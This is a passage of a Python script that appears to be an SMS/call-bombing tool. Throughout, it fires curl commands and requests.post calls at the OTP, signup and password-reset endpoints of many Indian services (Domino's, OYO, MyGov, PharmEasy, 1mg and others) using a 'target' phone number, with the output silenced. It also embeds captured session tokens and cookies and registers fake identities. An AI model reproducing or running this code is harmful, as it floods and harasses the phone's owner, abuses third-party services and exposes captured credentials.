"sessiontoken:IQoJb3JpZ2luX2VjEMr//////////wEaCmFwLXNvdXRoLTEiRzBFAiEA4sFayxxLv9j4wAzrU69oSRvmaYkeDofz/f1gp8VrJi4CIC0M4T1ub9JzK76+QQNfYtCKr2DaQDXYPzfB8CXM/cDvKpAGCEMQABoMNDM4NjY1MTEzMDI1IgylQi+diU9KYWi94q8q7QUwfYGnq+HXcmfGlnTxd+ED2mG5brVSANywP2EskO/7wyID+52gsCBVa1CYp+G7hbd6kb3meZJlWFgPrxpqkO5s9m3ScazAVYfu4abxReGoGJWrb8Rs4bo4ClsB4CMpXkQyb3g0QmbrE7+NAHSPMdajaMJRUJKH7LsRGjzjiDdDnGzaAMlzAKMmCAcOSfUtUobuduWY/NjXWtrb+BTjqS38n27WO0P8aa24uUM9z7/dUPdZzTJrSt0kTjfIPT/q5hKdrmi7ACn3tK6iG8/BnvWbLQBPkT3v82gHKHLwzq06ck6OP3ZCpey2ENo73tmAYZVdF8G/+JxVDBbs+DFP4Y3kTVHlHaUU+7H3/HOt6csf+80eU4seoG07O7Pl18cJANYSi01rNoeKRz/VdCwDshP0Igt3/ZwgH0U6aW+raZd3Xwcs4xODMYnNtnAoPlgrAEQ2RaeRqQbiRIqwznqEpgMBJFBWy8lSrJrtrxoDvT03Gsij0bZQ99zYel+kzNcNGz0E6M+/ZHRZstaWqPUQtQQ68Kq6tYw/tSFgzb/c4hmLrrT4ClVRTF7Gd/5x/HMhVCJ4qF5DMshUUcsG7Nf8BJawAqzC+IykNkanZ8Br30FRzHS4w+dYx2HnHF5MRTFgweQMJR/JYbTM441+cUtboDIaOi8sQnAf/Ck0F5U8ahWJn+NQfrW6UGDZsVe74/BFbDnnQbVCI+uI3/x5Bh2ByIDELiycxW2ZdLYugiQCM0ljToO4bvEOU+MMou3HS96+LZGRd/yYP7UDMNHAbbZCNTjk6FllvZwsoTLLowMbiktxeGQUn73mUjUMwLTm777vb+vRKtYDEh4Y8XpJtzuOk4FBo1+vKooHZMYD1AewDPUv3/NztxRu/VxtJ9lkgrvG5t0jX3rizrUfTyosRm6YXkx6pPwrNCJGp2+fHEltEf82qsaZ5/gcFmtzkPJ0fkjEjQtO892TOmBefuOk4NCS6pTz/PsCPym+hOBgyXImOTDY2tP9BTqHAmGJ0OdUlE9/lrr5HIxO35om1tFt6g12bQc/VitR4EEQ6BKzAQQzbrpLJzstSLhc03T2cYH8Algx/j+DvXJLeXS4rwsg0JvOs4UYUZsqh547d2qmqTw7T/CqX/6Pv8EZN/ZN+0fdbr5ALawN+foZdFVWj0MieiMEa6zVfzvCrVD2xxQVExeWb2h5SA3NIOn9mDuRoR+ch7LLnHghZCwDX2bRope4JCiyikiD5i6VpgRnJ6tmlNFwN7LY1l4cHwg5T9TdMmG6PNdKteMh/s2SeAU1l0uCcn3Y1675JxGipZfsEc2Je+QQ/Cksd2ptvzKn7u5s3p6eqPi/GfNV0pdepO6Fy5fInJM/" -H "dnt:1" -H "content-type:application/json" -H "access-control-allow-headers:*" -H "storeid:6585R" -H "ab_test_variant:Old Flow" -H "referer:https://m.dominos.co.in/login" -H "accept-encoding:gzip, deflate, br" -H "accept-language:en,hi;q=0.9" -d '{"lastName":"","mobile":"'''+target+'''","firstName":""}' "https://api.dominos.co.in/loginhandler/forgotpassword" > /dev/null 2>&1
    ''')
    requests.post(url1,headers=headers1, data=data1)
    os.system('''
    curl -X POST -H "Host:www.careers360.com" -H "content-length:551" -H "cache-control:max-age=0" -H "origin:https://www.careers360.com" -H "upgrade-insecure-requests:1" -H "dnt:1" -H "content-type:application/x-www-form-urlencoded" -H "user-agent:Mozilla/5.0 (Linux; Android 9; Redmi 6 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36" -H "accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3" -H "referer:https://www.careers360.com/user/register?destination=&click_location=header" -H "accept-encoding:gzip, deflate, br" -H "accept-language:en,hi;q=0.9" -H "cookie:_gat_UA-46098128-1=1" -H "cookie:WZRK_S_654-ZZ4-5Z5Z=%7B%22p%22%3A2%2C%22s%22%3A1615442265%2C%22t%22%3A1615442331%7D" -H "cookie:_dc_gtm_UA-46098128-1=1" -H "cookie:G_ENABLED_IDPS=google" -H "cookie:_fbp=fb.1.1615442263972.287121379" -H "cookie:WZRK_G=11b1ac98a6434bd3bf531f8930a8b5e4" -H "cookie:__auc=4f394ef21781fdc95d395e1ab07" -H "cookie:__asc=4f394ef21781fdc95d395e1ab07" -H "cookie:_gid=GA1.2.83082818.1615442253" -H "cookie:_ga=GA1.2.1609863453.1615442253" -H "cookie:_gcl_au=1.1.2109846685.1615442253" -H "cookie:csrftoken=hGKglWYRlX4jo91hUvmvIrw8CxV72jXxUWJiq22abqj7flRawEJPr1bHBaINa5sg" -H "cookie:dataLayer_=Home Pages" -H "cookie:_omappvp=COce7fS8fP7N1342MAsnIzRKludnKoiiVsHqGHK98cpUVuP4tI6rM61yqAcAHmxjaSWTkCi1rZ8zQBp4hvT1VxLVfdPYPxPl" -d 'csrfmiddlewaretoken=K2yOPxm3HvjvyATP3zuws4xtWPYUNsPNnixQUDqmxYyjpMJIFIRQbEc2VsLAVekw&google_id=&uid=&profile_picture=&display_name=Anbhav+Kayap&email=kaubhavkshyap%40gmail.com&mobile_number='''+target+'''&current_education_level=12&current_education_passing_year=2021&school_board=&aspiring_stream=&education_stream=4&location=Bhopal%2CMadhya+Pradesh&location_id=26&source_url=https%3A%2F%2Fwww.careers360.com%2Fuser%2Fregister%3Fdestination%3D%26click_location%3Dheader&csrfmiddlewaretoken=K2yOPxm3HvjvyATP3zuws4xtWPYUNsPNnixQUDqmxYyjpMJIFIRQbEc2VsLAVekw' "https://www.careers360.com/user/register?destination=&click_location=header" > /dev/null 2>&1
    ''')
    os.system('''
    curl -X GET -H "Host:m.netmeds.com" -H "accept:application/json, text/plain, */*" -H "dnt:1" -H "user-agent:Mozilla/5.0 (Linux; Android 9; Redmi 6 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36" -H "referer:https://m.netmeds.com/customer/account/login" -H "accept-encoding:gzip, deflate, br" -H "accept-language:en,hi;q=0.9" -H "cookie:G_ENABLED_IDPS=google" -H "cookie:_gat=1" -H "cookie:_gat_UA-63910444-1=1" -H "cookie:_fbp=fb.1.1615452001180.1333448853" -H "cookie:_gid=GA1.3.788821311.1615451990" -H "cookie:_ga=GA1.3.1426000040.1615451990" -H "cookie:_gcl_au=1.1.2084636185.1615451994" -H "cookie:_ALGOLIA=anonymous-fe190ecf-3c50-43fa-8799-838697d64d8d" -H "cookie:bsCoId=3605252647100" -H "cookie:bsUl=0" -H "cookie:_gid=GA1.2.788821311.1615451990" -H "cookie:_ga=GA1.2.1426000040.1615451990" "https://m.netmeds.com/mst/rest/v1/id/details/'''+target+'''" > /dev/null 2>&1
    ''')
    os.system('''
    curl -X POST -H "Host:magicpin.in" -H "content-length:27" -H "origin:https://magicpin.in" -H "user-agent:Mozilla/5.0 (Linux; Android 9; Redmi 6 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36" -H "dnt:1" -H "content-type:application/json" -H "accept:*/*" -H "referer:https://magicpin.in/" -H "accept-encoding:gzip, deflate, br" -H "accept-language:en,hi;q=0.9" -H "cookie:SLPC=1" -H "cookie:session_id=19705602" -H "cookie:q_session_id=16193136" -H "cookie:session=10979860" -H "cookie:_gat_gtm.js=1" -H "cookie:_gcl_au=1.1.1405431013.1624506720" -H "cookie:_gat=1" -H "cookie:_gid=GA1.2.756755525.1624506718" -H "cookie:_ga=GA1.2.2131574013.1624506718" -H "cookie:hide_animation=true" -d '{"auth_phone":"'''+target+'''"}' "https://magicpin.in/samapi/users/get-otp/" > /dev/null 2>&1
    ''')
#call
    os.system('''
    curl -X POST -H "Host:magicpin.in" -H "content-length:27" -H "origin:https://magicpin.in" -H "user-agent:Mozilla/5.0 (Linux; Android 9; Redmi 6 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36" -H "dnt:1" -H "content-type:application/json" -H "accept:*/*" -H "referer:https://magicpin.in/" -H "accept-encoding:gzip, deflate, br" -H "accept-language:en,hi;q=0.9" -H "cookie:SLPC=1" -H "cookie:session_id=19705602" -H "cookie:q_session_id=16193136" -H "cookie:session=10979860" -H "cookie:_gcl_au=1.1.1405431013.1624506720" -H "cookie:_gid=GA1.2.756755525.1624506718" -H "cookie:_ga=GA1.2.2131574013.1624506718" -H "cookie:hide_animation=true" -d '{"auth_phone":"'''+target+'''"}' "https://magicpin.in/samapi/users/get-otp-via-call/" > /dev/null 2>&1
    ''')
    os.system('''
    curl -X POST -H "Host:www.oyorooms.com" -H "content-length:51" -H "origin:https://www.oyorooms.com" -H "xsrf-token:Qjy9FFV5-ZYTU3TQkyngHO6X3WSuIuEY4OEs" -H "user-agent:Mozilla/5.0 (Linux; Android 9; Redmi 6 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36" -H "dnt:1" -H "content-type:text/plain;charset=UTF-8" -H "accept:*/*" -H "referer:https://www.oyorooms.com/login/" -H "accept-encoding:gzip, deflate, br" -H "accept-language:en,hi;q=0.9" -H "cookie:XSRF-TOKEN=Qjy9FFV5-ZYTU3TQkyngHO6X3WSuIuEY4OEs" -H "cookie:expd=mww2%3A1%7CBnTc%3A0%7Cnear%3A0%7Cioab%3A0%7Cmhdp%3A1%7Cbcrp%3A0%7Cpwbs%3A1%7Cmwsb%3A0%7Cslin%3A1%7Chsdm%3A0%7Clpex%3A1%7Clphv%3A0%7Cdpcv%3A0%7Cgmab%3A0%7Curhe%3A0%7Cprdp%3A1%7Ccomp%3A0%7Csldw%3A1%7Cmdab%3A0%7Cnrmp%3A1%7Cnhyw%3A1%7Cwboi%3A1%7Csst%3A1%7Ctxwb%3A1%7Cpod2%3A1%7Clnhd%3A1%7Cppsi%3A0%7Cgcer%3A1%7Crecs%3A1%7Cswhp%3A0%7Clvhm%3A1%7Cgmbr%3A0%7Cyolo%3A1%7Crcta%3A0%7Ccbot%3A1%7Cotpv%3A1%7Ctrtr%3A1%7Clbhw%3A1%7Cndbp%3A0%7Cmapu%3A1%7Cnclc%3A1%7Cdwsl%3A1%7Ceopt%3A1%7Cwizi%3A1" -H "cookie:_gat=1" -H "cookie:_gid=GA1.2.735182731.1615473719" -H "cookie:AMP_TOKEN=%24NOT_FOUND" -H "cookie:moe_uuid=242a83c3-906f-44a4-8d1d-27f350bb1ed1" -H "cookie:ql=true" -H "cookie:_uid=Not%20logged%20in" -H "cookie:_csrf=WFd_JrQQ-dkuuOWHVto0PExZ" -H "cookie:X-Location=georegion%3D104%2Ccountry_code%3DIN%2Cregion_code%3DBR%2Ccity%3DPATNA%2Clat%3D25.60%2Clong%3D85.12%2Ctimezone%3DGMT%2B5.50%2Ccontinent%3DAS%2Cthroughput%3Dvhigh%2Cbw%3D5000%2Casnum%3D45609%2Cnetwork_type%3Dmobile%2Clocation_id%3D0" -H "cookie:acc=IN" -H "cookie:tvc_utm_medium=cpc" -H "cookie:_gcl_aw=GCL.1614939359.Cj0KCQiAyoeCBhCTARIsAOfpKxi6TgUEA7i4MrdC6noSOg6dRiaqx-4lpHLSr71V6YbFcK6uPcSYJ8IaAonGEALw_wcB" -H "cookie:_gac_UA-52365165-1=1.1614939358.Cj0KCQiAyoeCBhCTARIsAOfpKxi6TgUEA7i4MrdC6noSOg6dRiaqx-4lpHLSr71V6YbFcK6uPcSYJ8IaAonGEALw_wcB" -H "cookie:tvc_utm_source=google" -H "cookie:_fbp=fb.1.1614939051661.1316403865" -H "cookie:_ga=GA1.2.2108019677.1614939051" -H "cookie:tvc_utm_content=(not set)" -H "cookie:tvc_utm_key=(not set)" -H "cookie:tvc_utm_campaign=(not set)" -H "cookie:_gcl_au=1.1.692282284.1614939050" -H "cookie:fingerprint2=fded8580a8f13d9f0ea624826878ff17" -H "cookie:token=SFI4TER1WVRTakRUenYtalpLb0w6VnhrNGVLUVlBTE5TcUFVZFpBSnc%3D" -H "cookie:appData=%7B%22userData%22%3A%7B%22isLoggedIn%22%3Afalse%7D%7D" -H "cookie:mab=2ea4e70b2c116340fa445ac1517dfea2" -d '{"phone":"'''+target+'''","country_code":"+91","nod":4}' "https://www.oyorooms.com/api/pwa/generateotp?locale=en" > /dev/null 2>&1
    ''')
    os.system('''
    curl -X POST -H "Host:zeus.housing.com" -H "content-length:125" -H "origin:https://housing.com" -H "app-name:mobile_web_buyer" -H "phoenix-api-name:LOGIN_SEND_OTP_API" -H "user-agent:Mozilla/5.0 (Linux; Android 9; Redmi 6 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36" -H "dnt:1" -H "content-type:application/json; charset=UTF-8" -H "accept:*/*" -H "referer:https://housing.com/user-profile" -H "accept-encoding:gzip, deflate, br" -H "accept-language:en,hi;q=0.9" -H "cookie:_uuid=c6edb275a2d45e81e9c74d06c83a4237" -H "cookie:moe_uuid=8c492902-cec6-4294-836d-c489bf2f6fd8" -H "cookie:tvc_sm_lc=direct%7Cnone" -H "cookie:tvc_sm_fc_new=direct%7Cnone" -H "cookie:_gat=1" -H "cookie:is_return_session=false" -H "cookie:is_return_user=false" -H "cookie:traffic=sourcemedium%3Ddirect%20%2F%20none%3B" -H "cookie:_psid=1" -H "cookie:_gid=GA1.2.461328941.1615474142" -H "cookie:_ga=GA1.2.783783769.1615474142" -H "cookie:experiments=hj%3Dtrue%3Bdirect_connect%3Dfalse%3Brental_videos%3Dfalse%3Bsrp_declutter%3Downer%3Bedge_landing_hook_srp%3Dtrue%3Binline_plot_position%3Dtrue%3Bpost_crf_edge_hook%3Dtrue%3Bsimilar_properties%3Dfalse%3Bsearch_screen_revamp%3Dfalse%3Bpost_crf_new_design%3Dv2%3Blogin_modal%3Dfalse%3Brecommendation_section%3Dtrue%3Binline_property_type%3Dtrue%3Bfilter_popup_exp%3Dfalse" -H "cookie:ssrExperiments=three_cta%3DviewPhone%3Bsearch_bar%3Dtrue%3Bcontact_seller_card%3Dtrue%3Bnew_pdp_desktop%3Dtrue%3Btemplate_banner%3Dfalse%3Brent_agreement_design_reverted%3Dold%3Bplot_listings_boost%3Dfalse" -H "cookie:category=residential" -H "cookie:service=buy" -H "cookie:cityUrl=patna" -H "cookie:userCity=ff6aef43f1485311aa29" -d '{"query":"____jsIh_jpM__jmG_jtx__jmG_jxZ__jkXifjvuhjtx___jtxjpM___jpMjxZ___jxZifjwsjsygg","variables":{"phone":"'''+target+'''"}}' "https://zeus.housing.com/api/gql?compressed=true&isBot=false&source=mobile" > /dev/null 2>&1
    ''')
    requests.post(url3, headers=headers3, data=data3)
    os.system('''
    curl -X POST -H "Host:auth.mygov.in" -H "Connection:keep-alive" -H "Content-Length:354" -H "Cache-Control:max-age=0" -H "Origin:https://auth.mygov.in" -H "Upgrade-Insecure-Requests:1" -H "DNT:1" -H "Content-Type:application/x-www-form-urlencoded" -H "User-Agent:Mozilla/5.0 (Linux; Android 9; Redmi 6 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36" -H "Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3" -H "Referer:https://auth.mygov.in/user/register?destination=oauth2/register/mygovweb" -H "Accept-Encoding:gzip, deflate, br" -H "Accept-Language:en,hi;q=0.9" -H "Cookie:_ga=GA1.2.242886447.1622179254; _gid=GA1.2.614933765.1622179254; has_js=1" -d 'full_name=Jekeiwhwv+emkeywfw&email=Sjjsjeh%40gmail.com&gateway%5Bcountry%5D=91&number='''+target+'''&links_fieldset%5Bdate%5D=05&links_fieldset%5Bmonth%5D=September&links_fieldset%5Byear%5D=2014&gender=male&referal-code=&op=Create+New+Account&form_build_id=form-k6ijtgOW_M78cdewP22plsylAKcR_In0f-Aeq7OkPiQ&form_id=pwdless_registration&timezone=Asia%2FKolkata' "https://auth.mygov.in/user/register?destination=oauth2/register/mygovweb" > /dev/null 2>&1
    ''')
    os.system('''
    curl -X POST -H "Host:api.lenskart.com" -H "accept:*/*" -H "x-api-client:desktop" -H "x-session-token:62dd4d88-36b5-48e9-a63a-64510a8502ed" -H "content-type:application/json; charset=utf-8" -H "content-length:26" -H "accept-encoding:gzip" -H "user-agent:okhttp/3.12.0" -d '{"telephone":"'''+target+'''"}' "https://api.lenskart.com/v2/customers/sendOtp" > /dev/null 2>&1
    ''')
    os.system('''
    curl -X GET -H "Host:api.coolwinks.com" -H "accept:*/*" -H "x-user-agent:Mozilla/5.0 (Linux; Android 9; Redmi 6 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36 CWUA/msite/0/" -H "origin:https://www.coolwinks.com" -H "user-agent:Mozilla/5.0 (Linux; Android 9; Redmi 6 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36" -H "dnt:1" -H "referer:https://www.coolwinks.com/" -H "accept-encoding:gzip, deflate, br" -H "accept-language:en,hi;q=0.9" "https://api.coolwinks.com/api/accounts/is_already_registered/?username='''+target+'''" > /dev/null 2>&1
    ''')
    os.system('''
    curl -X POST -H "Host:www.dineout.co.in" -H "content-length:78" -H "cache-control:max-age=0" -H "csrf-token:2OvNxVvP-38DzA5fwbgjyUZANrjcf8i9ka1Q" -H "origin:https://www.dineout.co.in" -H "x-requested-with:XMLHttpRequest" -H "user-agent:Mozilla/5.0 (Linux; Android 9; Redmi 6 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36" -H "dnt:1" -H "content-type:application/json" -H "accept:*/*" -H "referer:https://www.dineout.co.in/delhi" -H "accept-encoding:gzip, deflate, br" -H "accept-language:en,hi;q=0.9" -H "cookie:WZRK_S_48K-44K-5R5Z=%7B%22p%22%3A2%2C%22s%22%3A1615459433%2C%22t%22%3A1615459444%7D" -H "cookie:mobilecityselect=Delhi" -H "cookie:city_selected_for_branch=1" -H "cookie:mobilecityselect_girf=delhi" -H "cookie:homepage_coachmark_activate=1" -H "cookie:_fbp=fb.2.1615459432116.425534624" -H "cookie:_col_uuid=3cf13291-f3b5-4029-b314-65386dbaca92-10oct" -H "cookie:WZRK_G=7753a9781ee04a9c8c989e8bd7666cc1" -H "cookie:gaClientId=1338193003.1615459432" -H "cookie:_gid=GA1.3.1979041323.1615459432" -H "cookie:_ga=GA1.3.1338193003.1615459432" -H "cookie:firstUser=1" -H "cookie:connect.sid=s%3AgCMpjEs4lTBBd4Q14ZsAtVfYvxAc4IrZ.x3v4z3tv4dxrLGK9Zhq%2Fdk6XczraYAQcOd%2FXrUI6YC0" -H "cookie:city_id=0" -H "cookie:city_name=Delhi" -H "cookie:countly_webapp_uid=gCMpjEs4lTBBd4Q14ZsAtVfYvxAc4IrZ" -d '{"name":"Bwjskss isoisiw","email":"Ekkekejejs@gmail.com","phone":"'''+target+'''"}' "https://www.dineout.co.in/xhr-request/user_signup" > /dev/null 2>&1
    ''')
    os.system('''
    curl -X POST -H "Host:www.fiewin.com" -H "content-length:22" -H "origin:https://www.fiewin.com" -H "user-agent:Mozilla/5.0 (Linux; Android 9; SM-J810G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36" -H "content-type:application/json" -H "accept:application/json" -H "platform:web" -H "save-data:on" -H "token:null" -H "referer:https://www.fiewin.com/" -H "accept-language:en-GB,en-US;q=0.9,en;q=0.8" -d '{"phone":"'''+target+'''"}' "https://www.fiewin.com/fiewin/api/user/sms" > /dev/null 2>&1
    ''')
    os.system('''
    curl -X POST -H "Host:user.vedantu.com" -H "content-length:86" -H "origin:https://www.vedantu.com" -H "user-agent:Mozilla/5.0 (Linux; Android 9; Redmi 6 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36" -H "dnt:1" -H "content-type:application/json" -H "accept:*/*" -H "referer:https://www.vedantu.com/" -H "accept-encoding:gzip, deflate, br" -H "accept-language:en,hi;q=0.9" -H "cookie:auth-token=8Hq63zA7QQVD8MmU" -H "cookie:_gat_UA-52838179-3=1" -H "cookie:_gid=GA1.2.624049798.1615786439" -H "cookie:moe_uuid=74a7d1ab-2260-499b-bda7-1659c58cd1e9" -H "cookie:_ga=GA1.2.554847093.1604856644" -H "cookie:_fbp=fb.1.1604856654985.1797259468" -H "cookie:_gcl_au=1.1.1070360993.1604856652" -H "cookie:__gads=ID=aef20d5a351756d5-22499e07a0c40058:T=1604856647:RT=1604856647:S=ALNI_MbU7SOHPE_YWw8nYcBMB_e1i9BkdQ" -H "cookie:USER_DATA=%7B%22attributes%22%3A%5B%5D%2C%22subscribedToOldSdk%22%3Afalse%2C%22deviceUuid%22%3A%2274a7d1ab-2260-499b-bda7-1659c58cd1e9%22%2C%22deviceAdded%22%3Atrue%7D" -d '{"email":null,"phoneCode":"+91","phoneNumber":"'''+target+'''","version":2,"ver":"11.627"}' "https://user.vedantu.com/user/preLoginVerification" > /dev/null 2>&1
    ''')
    requests.post(url2, headers=headers2, data=data2)
    os.system('''
    curl -X POST -H "Host:pharmeasy.in" -H "content-length:30" -H "origin:https://pharmeasy.in" -H "x-real-ip:" -H "user-agent:Mozilla/5.0 (Linux; Android 9; Redmi 6 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36" -H "x-ua:" -H "content-type:application/json" -H "x-phone-platform:mweb" -H "dnt:1" -H "x-ff:" -H "accept:*/*" -H "referer:https://pharmeasy.in/?src=sidebarmenu" -H "accept-encoding:gzip, deflate, br" -H "accept-language:en,hi;q=0.9" -H "cookie:pe_last_active=Fri%20Mar%2019%202021%2011:31:15%20GMT+0530%20(India%20Standard%20Time)" -H "cookie:WZRK_S_R9Z-WWR-854Z=%7B%22p%22%3A1%2C%22s%22%3A1616133618%2C%22t%22%3A1616133669%7D" -H "cookie:tvc_supplier_city=Kolkata" -H "cookie:tvc_selected_city=Patna" -H "cookie:tvc_selected_city_type=non-courier" -H "cookie:_gat_UA-60621013-1=1" -H "cookie:_gid=GA1.2.1912792291.1616133616" -H "cookie:_uetvid=609bf700887811ebb341f74b475bd722" -H "cookie:_uetsid=609a8720887811ebaa3c99b453dc8dec" -H "cookie:XPESD={%22session_id%22:%22s_w_01913f296fdf72a239551f74a1be90c9_1616133615000%22%2C%22session_id_flag%22:%22fingerprint%22%2C%22referrer%22:%22https://www.google.com/%22%2C%22session_start_time%22:%222021-03-19T06:00:15.513Z%22}" -H "cookie:X-IP=171.51.156.24%2C%2023.46.9.46" -H "cookie:_fw_crm_v=4b1d40e9-3fa0-4143-9481-109d98e96362" -H "cookie:_fbp=fb.1.1613669871482.1291244427" -H "cookie:WZRK_G=e28edd53a6fa4aa6bd29fc773dc2cb4b" -H "cookie:_ga=GA1.2.1083404775.1613669838" -H "cookie:_gcl_au=1.1.837872183.1613669835" -H "cookie:XPESS=active" -H "cookie:XdI=01913f296fdf72a239551f74a1be90c9" -H "cookie:X-Pincode=800020" -H "cookie:X-Default-City=861" -H "cookie:X-Phone-Platform=mweb" -H "cookie:X-App-Version=2.0" -d '{"contactNumber":"'''+target+'''"}' "https://pharmeasy.in/api/auth/requestOTP" > /dev/null 2>&1
    ''')
    os.system('''
    curl -X POST -H "Host:www.1mg.com" -H "content-length:67" -H "x-html-canrender:True" -H "pragma:no-cache" -H "hkp-platform:Healthkartplus-0.0.1-mobileweb" -H "x-csrf-token:MDLM2Mw0-_cJEPJkZwVNXP60KWKkwbOMcd8E" -H "x-platform:mobileweb-0.0.1" -H "visitor-id:943b5a7a-98a5-4671-c637-90b72cd27dcc_acce55_1616133815" -H "content-type:application/json" -H "accept:application/vnd.healthkartplus.v11+json" -H "cache-control:no-cache, no-store, must-revalidate" -H "user-agent:Mozilla/5.0 (Linux; Android 9; Redmi 6 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36" -H "dnt:1" -H "origin:https://www.1mg.com" -H "referer:https://www.1mg.com/" -H "accept-encoding:gzip, deflate, br" -H "accept-language:en,hi;q=0.9" -H "cookie:_gat=1" -H "cookie:_gat_UA-21820217-6=1" -H "cookie:AMP_TOKEN=%24NOT_FOUND" -H "cookie:__gads=ID=49afeaab6934ccdd:T=1616133829:S=ALNI_MayOmW0puejFnnAHqBtoTtgcSTiLw" -H "cookie:lt_synch_timestamp=RudderEncrypt%3AU2FsdGVkX1%2FD31DiOFWBetx9EnByunHmcfE0Ni4wi0Y%3D" -H "cookie:_gcl_au=1.1.169833827.1616133828" -H "cookie:_gid=GA1.2.2091105844.1616133828" -H "cookie:_ga=GA1.2.1236928672.1616133828" -H "cookie:_uetvid=dda6d5f0887811eb833aad7ded4338e6" -H "cookie:_uetsid=dda54320887811ebbe72551805a24e27" -H "cookie:rl_trait=RudderEncrypt%3AU2FsdGVkX19ijzixNrW2gztiSGz%2B9LdA3IaY0PmjJeCTbVANhdXY6bK%2B8VzN9YLpAIz5Re6O4xqtMRzSjocnPg%3D%3D" -H "cookie:rl_user_id=RudderEncrypt%3AU2FsdGVkX1%2BeVFVkw9su1nUg0oDb2qb00lLF54Fz%2FwX4tJPqZGRQoNfuWeWb2Zv9shPMxvUNk3AhkCXTJfz37qwLjwisRZv3cWdSpXpfUVc%3D" -H "cookie:rl_page_init_referring_domain=RudderEncrypt%3AU2FsdGVkX1%2FJHBmIPZFvNCYxn%2Bbd8js58Eix29SmgzthUIgi9X7ReVobo5bvMyhIRGvX2uUvj%2BdWAGBfXn46qA%3D%3D" -H "cookie:rl_page_init_referrer=RudderEncrypt%3AU2FsdGVkX1%2FInG90S7EqvNai2IN9XVGlccl3q8x%2FQMicY8ASe%2BCsaP7WDmDogQIeCjnMIMkvP8ujRipbzIKmjTh%2FuOo0shAuFQMpBU5%2FlPl9L32O2%2Bp%2BtfiWa7DeebD0OmFUIpBHqXAzihUGG1%2FpsNLfhUxhr62uaIbAV%2B7ePKA%3D" -H "cookie:rl_group_trait=RudderEncrypt%3AU2FsdGVkX1%2B8iYRamIuAbjkUd4V8bPxyPEAKkHXFEWQ%3D" -H "cookie:rl_group_id=RudderEncrypt%3AU2FsdGVkX1%2BPG%2Bx0wsYANK2Pjf8hV21WqtkbKcMhg20%3D" -H "cookie:rl_anonymous_id=RudderEncrypt%3AU2FsdGVkX188MPYerV4tK2Ci53XvddApXxvLo8AAoCYgswGTkNt0vh9sauX4HJxWukKvsrLW%2FiSSThdA3cMJFQ%3D%3D" -H "cookie:session=_VjnEM2S6Lc0rhkxPNqyLA.LDa84sSEwGj0SMu1nwhKgt982xVBApRNAhvVm_ZcnW5An-XNGn8Q3j79B7MTu0ymIUXFauBFuTo36MRJ8zp1PDs4na1RcUIv6q0lgg0LjJbA7dRIQ8g7qGwmMt2NulU0bMXrKW0Y0FdU5d69iEv_tQ.1616133823362.2592000000.V7OupvADscMyR84vM3XtkZkPe-MET8UXxtYI679g6-A" -H "cookie:geolocation=false" -H "cookie:_fbp=fb.1.1616133817973.953661193" -H "cookie:isLocaleUIChange=false" -H "cookie:isLocaleRedirect=false" -H "cookie:_csrf=Ttb2QR8pJU0ksy564C9G2bzL" -H "cookie:amoSessionId=03789748-65f3-48ba-a4ea-675a4fc9d394" -H "cookie:abExperimentShow=true" -H "cookie:abVisitorId=425969" -H "cookie:city=New%20Delhi" -H "cookie:VISITOR-ID=943b5a7a-98a5-4671-c637-90b72cd27dcc_acce55_1616133815" -H "cookie:__cfduid=dc218313a75476ae19bc4b9b96a07d5401616133815" -d '{"number":"'''+target+'''","is_corporate_user":false,"is_doctor":false}' "https://www.1mg.com/auth_api/v4/create_token" > /dev/null 2>&1
    ''')
    os.system('''
    curl -X POST -H "Host:www.eatsure.com" -H "content-length:75" -H "origin:https://www.eatsure.com" -H "user-agent:Mozilla/5.0 (Linux; Android 9; Redmi 6 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36" -H "dnt:1" -H "content-type:application/json;charset=UTF-8" -H "accept:*/*" -H "referer:https://www.eatsure.com/rewards" -H "accept-encoding:gzip, deflate, br" -H "accept-language:en,hi;q=0.9" -H "cookie:_gat=1" -H "cookie:__insp_norec_sess=true" -H "cookie:_fbp=fb.1.1620322978215.566000624" -H "cookie:__insp_targlpt=U2FmZXN0IE9ubGluZSBGb29kIERlbGl2ZXJ5IHwgRWF0U3VyZQ%3D%3D" -H "cookie:__insp_targlpu=aHR0cHM6Ly93d3cuZWF0c3VyZS5jb20v" -H "cookie:__insp_nv=true" -H "cookie:__insp_slim=1620322977964" -H "cookie:__insp_wid=1863028814" -H "cookie:_gid=GA1.2.690197277.1620322977" -H "cookie:_ga=GA1.2.406372635.1620322977" -H "cookie:utm_source=organic" -H "cookie:_sid=s%3A8fbe351a-6dc0-71f5-a055-5c1c13c6c04a-1620322971876.%2BM2CAqkefX75ejbFEInvThVzZqS4NMgnosMtsVxWVF0" -d '{"phone_number":"'''+target+'''","is_new_customer":true,"should_send_otp":true}' "https://www.eatsure.com/v1/api/send_otp" > /dev/null 2>&1
    ''')
    requests.post(url, headers=headers, data=data)
    os.system('''
